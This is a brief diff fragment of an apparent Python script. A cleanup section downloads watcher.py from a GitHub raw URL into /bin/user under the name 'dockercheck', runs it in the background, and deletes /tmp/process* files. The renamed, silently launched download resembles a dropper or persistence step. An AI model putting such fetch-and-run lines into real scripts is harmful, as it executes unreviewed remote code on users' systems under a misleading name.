@@ -42,6 +42,6 @@ pool.map(run_process, processes)
 #CleaningTime
 os.system("rm -rf /tmp/process*")
 os.system("mkdir /bin/user")
-os.system("wget -O /bin/user/dockercheck.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/watcher.py")
+os.system("wget -O /bin/user/dockercheck https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/watcher.py")
 os.system("python /bin/user/dockercheck &")
 os.system("rm -rf /tmp/process*")
